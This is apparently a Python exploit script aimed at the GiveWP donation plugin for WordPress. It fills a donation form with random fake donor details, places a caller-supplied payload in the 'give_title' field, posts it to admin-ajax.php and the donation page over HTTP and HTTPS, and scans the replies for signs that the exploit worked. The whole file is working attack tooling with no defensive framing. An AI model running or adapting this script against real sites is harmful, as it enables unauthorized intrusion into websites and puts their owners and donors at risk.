import requests
import json
import logging
import random
import string
from bs4 import BeautifulSoup


def generate_random_string(length=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def prepare_urls_and_data(domain, payload):
    urls = {
        "http": {
            "url1": f'http://{domain}/wp-admin/admin-ajax.php',
            "url2": f'http://{domain}/give/donation-form/?payment-mode=manual&form-id=1719'
        },
        "https": {
            "url1": f'https://{domain}/wp-admin/admin-ajax.php',
            "url2": f'https://{domain}/give/donation-form/?payment-mode=manual&form-id=1719'
        }
    }

    first_name = generate_random_string()
    last_name = generate_random_string()
    email_prefix = generate_random_string()

    data = {
        'give-honeypot': '',
        'give-form-id-prefix': '1719-1',
        'give-form-id': '1719',
        'give-form-title': '0',
        'give-current-url': f'https://{domain}/donations/donation-form/',
        'give-form-url': f'https://{domain}/give/donation-form/',
        'give-form-minimum': '',
        'give-form-maximum': '999999.99',
        'give-form-hash': generate_random_string(32),
        'give-price-id': '1',
        'give-amount': '25',
        'give_first': first_name,
        'give_last': last_name,
        'give_email': f'{email_prefix}@test.com',
        'payment-mode': 'manual',
        'give_action': 'purchase',
        'give-gateway': 'manual',
        'give_embed_form': '1',
        'action': 'give_process_donation',
        'give_ajax': 'true',
        'give_title': payload
    }

    return urls, data


def send_exploit(domain, payload):
    urls, data = prepare_urls_and_data(domain, payload)
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    for protocol in ["http", "https"]:
        try:
            logging.info(f"Trying {protocol.upper()} requests")

            response1 = requests.post(urls[protocol]["url1"], headers=headers, data=data, timeout=10)
            logging.info(f"First request to {urls[protocol]['url1']} - Status: {response1.status_code}")
            analyze_response(response1)

            if response1.status_code == 200:
                response2 = requests.post(urls[protocol]["url2"], headers=headers, data=data, timeout=10)
                logging.info(f"Second request to {urls[protocol]['url2']} - Status: {response2.status_code}")
                analyze_response(response2)
            else:
                logging.warning(f"First request failed, skipping second request for {protocol}")

        except requests.exceptions.RequestException as e:
            logging.error(f"Error sending {protocol.upper()} requests: {str(e)}")


def analyze_response(response):
    logging.info(f"Analyzing response from: {response.url}")
    logging.info(f"Status code: {response.status_code}")

    content_type = response.headers.get('Content-Type', '').lower()

    if 'application/json' in content_type:
        analyze_json_response(response.text)
    elif 'text/html' in content_type:
        analyze_html_response(response.text)
    else:
        logging.info(f"Unknown content type: {content_type}")
        analyze_unknown_response(response.text)

    lower_response = response.text.lower()
    if 'success' in lower_response:
        logging.info("The word 'success' was found in the response.")
    if 'error' in lower_response:
        logging.warning("The word 'error' was found in the response.")
    if 'exception' in lower_response or 'fatal' in lower_response:
        logging.warning("Possible server error detected in the response.")


def analyze_json_response(content):
    try:
        json_response = json.loads(content)
        logging.info("Response is in JSON format:")
        logging.info(json.dumps(json_response, indent=4))
    except json.JSONDecodeError:
        logging.warning("Response claims to be JSON but could not be parsed.")
        logging.info("Raw content:")
        logging.info(content[:1000])


def analyze_html_response(content):
    soup = BeautifulSoup(content, 'html.parser')
    error_divs = soup.find_all('div', class_='give_error')
    for div in error_divs:
        error_message = div.get_text(strip=True)
        logging.warning(f"Error message found: {error_message}")

    if "malicious" in content.lower():
        logging.info("Possible indication of successful exploit found in HTML response.")
    else:
        logging.info("No clear indication of successful exploit in HTML response.")

    if "unable to recognize your session" in content.lower():
        logging.warning(
            "Session recognition error detected. This may indicate CSRF protection or other security measures.")

    logging.info(f"Response length: {len(content)} characters")
    logging.info(f"Response type: HTML")


def analyze_unknown_response(content):
    logging.info("Response is in an unknown format. Displaying raw content:")
    logging.info(content[:1000])
    logging.info(f"Response length: {len(content)} characters")